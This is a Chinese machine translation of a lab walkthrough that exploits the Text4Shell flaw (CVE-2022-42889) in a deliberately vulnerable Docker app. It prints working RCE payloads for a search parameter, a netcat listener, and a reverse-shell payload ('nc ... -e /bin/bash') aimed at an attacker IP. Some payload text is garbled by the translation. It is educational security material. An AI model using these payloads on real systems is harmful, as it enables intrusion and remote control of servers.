<html>
<head>
<title>Exploiting ‘Text4Shell’ vulnerability (CVE-2022–42889)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用“Text4Shell”漏洞(CVE-2022–42889)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/text4shell-poc-cve-2022-42889-f6e9df41b3b7?source=collection_archive---------0-----------------------#2022-10-20">https://infosecwriteups.com/text4shell-poc-cve-2022-42889-f6e9df41b3b7?source=collection_archive---------0-----------------------#2022-10-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="7515" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">摘要<br/> </strong>这篇文章展示了攻击者如何利用Text4Shell漏洞(CVE-2022–42889)。为此，我们将使用U. J. Karthik的PoC应用程序text4shell-poc.jar。</p><p id="089b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">免责声明<br/> </strong>本文仅用于信息和教育目的，并面向那些愿意并好奇了解安全性和渗透测试的人。内容不得用于非法目的。如果你准备好学习新的好东西，那么继续读下去。</p><p id="4386" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">详情<br/></strong>2022年10月13日向Apache披露了Text4shell漏洞。Text4Shell是一个影响Java产品的漏洞，这些产品使用Apache Commons文本库的某些功能，使得远程攻击者能够在服务器上执行任意代码。更多信息请参见<a class="ae kl" href="https://www.tarlogic.com/blog/cve-2022-42889-critical-vulnerability-affects-apache-commons-text/#CVE-2022-42889_Key_Features" rel="noopener ugc nofollow" target="_blank">https://www . tarlogic . com/blog/CVE-2022-42889-critical-vulnerability-affects-Apache-commons-text/# CVE-2022-42889 _ Key _ Features</a>。</p><p id="d6a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">易受攻击的应用程序具有以下特征:</p><p id="256a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-使用Apache Commons版本1.5到1.9 <br/> -这个库用于sting操作</p><p id="f347" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个PoC中，我们将使用一个Dockerized测试应用程序“text4shell-poc.jar”。这个测试应用程序是由来自德里<a class="ae kl" href="https://github.com/karthikuj" rel="noopener ugc nofollow" target="_blank">(https://github.com/karthikuj</a>)的道德黑客/开发者U J Karthik创建的。</p><p id="c982" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">POC由一台Linux机器(我们的受害者)和一台攻击者机器(Kali Linux 2022.3版本)组成。</p><p id="64d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者(安装text 4 shell-POC . jar)<br/>—Ubuntu 20.04(x64)<br/>—IP地址:192.168.62.174</p><p id="96f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击者(用于反向外壳)<br/> — Kali Linux <br/> — IP地址:192.168.62.161</p><p id="9583" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来的部分包括:<br/> -步骤1–3:易受攻击的应用程序的安装要求<br/> -步骤4–8:安装易受攻击的应用程序<br/> -步骤9–13:在易受攻击的web应用程序上执行远程代码<br/> -步骤14–15用攻击者机器设置反向外壳<br/> -缓解<br/> -信用</p><p id="9fb9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">易受攻击应用的安装要求</strong></p><p id="6821" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了让易受攻击的Java应用程序启动并运行，我们需要安装OpenJDK、Maven和Docker。</p><p id="42ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="6fef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">安装OpenJDK</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="bf55" class="kv kw iq kr b gy kx ky l kz la">sudo apt update &amp;&amp; sudo apt install openjdk-11-jdk</span></pre><p id="798a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="f423" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们已经安装了docker。</p><p id="982e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哪个码头工人</p><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi lb"><img src="../Images/6401d18bae3ef0ffa533e1bdc57fbf2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:588/format:webp/1*QKaoIQk9uDG8P_WMZZtTTg.png"/></div></div></figure><p id="8e0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您没有docker:</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="534a" class="kv kw iq kr b gy kx ky l kz la">sudo apt install docker.io containerd runc</span></pre><p id="c745" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="a86e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在/opt中安装Maven</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="60f0" class="kv kw iq kr b gy kx ky l kz la">cd /tmp<br/>wget <a class="ae kl" href="https://mirrors.estointernet.in/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz" rel="noopener ugc nofollow" target="_blank">https://mirrors.estointernet.in/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</a><br/>tar -xvf apache-maven-3.6.3-bin.tar.gz<br/>sudo mv apache-maven-3.6.3 /opt/</span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi lj"><img src="../Images/cd303bb646df35df25472db001b0a931.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cQYQ9ijQr2agnpR-Efr2Mw.png"/></div></div></figure><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi lj"><img src="../Images/9c696b43ec315b12cfc838822f005770.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ucYPojqLPI4f20al-Prrfg.png"/></div></div></figure><p id="594f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">设置环境参数</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="9b79" class="kv kw iq kr b gy kx ky l kz la">M2_HOME='/opt/apache-maven-3.6.3'<br/>PATH="$M2_HOME/bin:$PATH"<br/>export PATH</span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/47f55ed852d23e30298f0d8940bf5024.png" data-original-src="https://miro.medium.com/v2/resize:fit:980/format:webp/1*rM7D90p2pmghtgjYovOVDw.png"/></div></figure><p id="0d99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">安装易受攻击的应用程序</strong></p><p id="c68f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="779f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载PoC应用程序</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="e72d" class="kv kw iq kr b gy kx ky l kz la">cd /tmp<br/>git clone <a class="ae kl" href="https://github.com/karthikuj/cve-2022-42889-text4shell-docker.git" rel="noopener ugc nofollow" target="_blank">https://github.com/karthikuj/cve-2022-42889-text4shell-docker.git</a></span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi ll"><img src="../Images/190090edfff3d7e1a84f28e8a27ed5f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MG45XkCKsslbzY0SvA9T2A.png"/></div></div></figure><p id="06a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="bba7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用maven构建应用程序。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="0265" class="kv kw iq kr b gy kx ky l kz la">cd /tmp/cve-2022-42889-text4shell-docker/<br/>mvn clean install</span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi lm"><img src="../Images/8cff06accf5bcb11003d81e6f3e1274d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/1*SEfa2_JuqjZ2Sgn86LUl7Q.png"/></div></figure><p id="44db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="8516" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为易受攻击的应用程序构建docker容器。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="de14" class="kv kw iq kr b gy kx ky l kz la">docker build --tag=text4shell .</span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi ln"><img src="../Images/ba8fc2c26372ce4b18997fd040925658.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4YpcEucGhIgCcYfWrYbpBw.png"/></div></div></figure><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/023f895824fdd355b7e32d21372426b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*-g4nbaWUpKyKRCFo3J12tg.png"/></div></figure><p id="f8c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">7.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="d1d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动docker映像。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="b806" class="kv kw iq kr b gy kx ky l kz la">docker run -p 80:8080 text4shell</span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi lp"><img src="../Images/3610c9c2250a9ea87fabfd8bf6552a5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*62WMBlwogL2KPRbj-TOjIw.png"/></div></div></figure><p id="0ecd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">8.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="8b63" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在受害机器上测试应用程序。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="f96a" class="kv kw iq kr b gy kx ky l kz la">firefox <a class="ae kl" href="http://localhost/text4shell/attack?search=blablabla" rel="noopener ugc nofollow" target="_blank">http://localhost/text4shell/attack?search=blablabla</a></span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi lq"><img src="../Images/2b43888220bfa75ac849cc78fc7beb2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/1*i5pRPu8clIZNLCiuZ5doMw.png"/></div></figure><p id="d14d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">在易受攻击的web应用程序上执行远程代码</strong></p><p id="57bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，使用攻击者机器进行进一步的开发。</p><p id="2e32" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">9.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="c8e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们的攻击者机器上测试应用程序。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="4a59" class="kv kw iq kr b gy kx ky l kz la">firefox <a class="ae kl" href="http://192.168.62.174/text4shell/attack?search=blablabla" rel="noopener ugc nofollow" target="_blank">http://192.168.62.174/text4shell/attack?search=blablabla</a></span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi lr"><img src="../Images/e79357f68e49373546591b49abc70f83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1340/format:webp/1*wCB5tzeNusJLQQcj4e00rw.png"/></div></figure><p id="7b8e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">10.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="7d47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在通过传递字符串“${prefix:name}”攻击远程web服务器。</p><p id="451b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="http://192.168.62.174/text4shell/attack?search=${script:javascript:java.lang.Runtime.getRuntime().exec'touch" rel="noopener ugc nofollow" target="_blank">http://192 . 168 . 62 . 174/text 4 shell/attack？search = $ { script:JavaScript:Java . lang . runtime . get runtime()。exec'touch </a> /tmp/foo')}</p><p id="8bb2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重要提示:上面的字符串包含:“exec。摸摸”。这是不正确的，一定是”。高管<strong class="jp ir">(</strong>‘摸’。由于Medium.com输入验证，不可能使用“.exec '(触摸)。手动添加缺少的“(”。</p><p id="1efc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Url对上面的字符串进行编码(<a class="ae kl" href="https://www.urlencoder.org/" rel="noopener ugc nofollow" target="_blank">https://www.urlencoder.org/</a>)。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="7ef7" class="kv kw iq kr b gy kx ky l kz la"><a class="ae kl" href="http://192.168.62.174/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%27%27touch%20%2Ftmp%2Ffoo%27%29%7D" rel="noopener ugc nofollow" target="_blank">http://192.168.62.174/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.<strong class="kr ir">exec%27</strong>touch%20%2Ftmp%2Ffoo%27%29%7D</a></span></pre><p id="ecef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重要:上面的字符串包含:"。执行%27”。这是不正确的，一定是”。exec% <strong class="jp ir"> 28 </strong> %27”。由于Medium.com输入验证，不可能使用“.exec% <strong class="jp ir"> 28 </strong> %27”。手动添加缺少的“%28”..</p><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi ls"><img src="../Images/5aa6170bb109f41d0fe8d7bb776f8e01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*yb_GsDQ9K10JchlVMwgx2g.png"/></div><figcaption class="lt lu gj gh gi lv lw bd b be z dk translated">这是正确的输出。</figcaption></figure><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi lj"><img src="../Images/894cd3727291985e57cd1170d3ebd400.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cN1dmZikfkK1AskTEgQiOg.png"/></div></div></figure><p id="1124" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">11.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="1915" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获取码头集装箱id</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="1b6d" class="kv kw iq kr b gy kx ky l kz la">docker container ls</span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi lj"><img src="../Images/c36ec1809acc7c9949af3d1870760dfc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VaosCj2EhO4ESMsk0CEmvg.png"/></div></div><figcaption class="lt lu gj gh gi lv lw bd b be z dk translated">集装箱编号:4bc32732e273</figcaption></figure><p id="0b36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">12.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="866c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在docker容器中启动一个bash shell。使用docker exec -it <container_id> bash</container_id></p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="2db9" class="kv kw iq kr b gy kx ky l kz la">docker exec -it <!-- -->4bc32732e273 <!-- -->bash</span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi lx"><img src="../Images/a04e58327cf99ae46c102f026c9f65a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3cojJLs6dvdZo5Ue8trKfQ.png"/></div></div></figure><p id="bf2e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">13.在192.168.62.174上执行(受害机，Ubuntu Linux)。</p><p id="e5b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查RCE是否成功。(您应该会看到在/tmp目录中创建了一个名为foo的文件):</p><p id="b929" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ls /tmp</p><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/a31883d92542f99f62bef876c94489c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1256/format:webp/1*m4LQPcKcT5PuyFtBSp9_Vw.png"/></div><figcaption class="lt lu gj gh gi lv lw bd b be z dk translated">我们有文件夹/tmp/foo！RCE成功了。</figcaption></figure><p id="ed29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个文件夹叫‘Foo’，RCE很成功。</p><p id="b663" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">用攻击者的机器设置一个反向外壳</strong></p><p id="0aa1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们很幸运地在应用程序docker容器中找到了netcat。我们可以使用本地netcat版本来设置一个反向shell。</p><p id="3c3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">14.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="87ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">设置netcat监听器。</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="b048" class="kv kw iq kr b gy kx ky l kz la">rlwrap nc -nlvp 443</span></pre><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi lz"><img src="../Images/4c66469913f6a6b94a0e7316f9e97ba0.png" data-original-src="https://miro.medium.com/v2/resize:fit:528/format:webp/1*H6I2yF4uLkZec68EWrqwEw.png"/></div></figure><p id="e069" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">15.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="2e6c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">构建有效载荷:</p><p id="ffef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">$ { script:JavaScript:Java . lang . runtime . get runtime()。' exec ' NC 192 . 168 . 62 . 161 443-e/bin/bash ')}</p><p id="a5f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重要:上面的字符串包含:"。执行nc。这是不正确的，一定是”。exec<strong class="jp ir">(</strong>‘NC’。由于Medium.com输入验证，不可能使用“.执行(“nc”)。手动添加缺少的“(”。</p><p id="636c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效负载的URL编码</p><pre class="km kn ko kp gt kq kr ks kt aw ku bi"><span id="010a" class="kv kw iq kr b gy kx ky l kz la"><a class="ae kl" href="http://192.168.62.174/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%27%27nc%20192.168.62.161%20443%20-e%20%2Fbin%2Fbash%27%29%7D" rel="noopener ugc nofollow" target="_blank">http://192.168.62.174/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.<strong class="kr ir">exec%27</strong>nc%20192.168.62.161%20443%20-e%20%2Fbin%2Fbash%27%29%7D</a></span></pre><p id="417f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重要:上面的字符串包含:"。执行%27”。这是不正确的，一定是”。执行% <strong class="jp ir"> 28 </strong> %27”。由于Medium.com输入验证，不可能使用“.执行% <strong class="jp ir"> 28 </strong> %27”。手动添加缺少的“%28”</p><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/34bb5f53ef048a14ddf85d6d8f53173a.png" data-original-src="https://miro.medium.com/v2/resize:fit:952/format:webp/1*dm-wEZYL509gRidOZ-oiig.png"/></div><figcaption class="lt lu gj gh gi lv lw bd b be z dk translated">这是正确的输出。</figcaption></figure><figure class="km kn ko kp gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi lj"><img src="../Images/309faa0ee82278cd474ed5709a12b408.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Pbvts5yTCMbOJ9ks_1EjDA.png"/></div></div><figcaption class="lt lu gj gh gi lv lw bd b be z dk translated">导航到URL后的结果。</figcaption></figure><p id="9799" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在检查我们的卡利反向监听器。</p><figure class="km kn ko kp gt lc gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/8ded0ea57c86ef0c35e6c18ec7799e62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/format:webp/1*_O4P6lq94EVDBDmJTm2DHA.png"/></div><figcaption class="lt lu gj gh gi lv lw bd b be z dk translated">从容器中取出外壳</figcaption></figure><p id="6032" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">缓解</strong></p><p id="d1ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Apache发布了一个新版本的Commons Text Library版本的补丁。安装这一新版本可以缓解该漏洞。</p><p id="ab9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">学分</strong></p><p id="9508" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">特别感谢U. J. Karthik的这一PoC应用(<a class="ae kl" href="https://github.com/karthikuj" rel="noopener ugc nofollow" target="_blank">https://github.com/karthiku</a>)<br/>感谢那些发现这一漏洞并首先向Apache披露的研究人员。</p></div><div class="ab cl mc md hu me" role="separator"><span class="mf bw bk mg mh mi"/><span class="mf bw bk mg mh mi"/><span class="mf bw bk mg mh"/></div><div class="ij ik il im in"><h2 id="754c" class="kv kw iq bd mj mk ml dn mm mn mo dp mp jy mq mr ms kc mt mu mv kg mw mx my mz bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kl" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>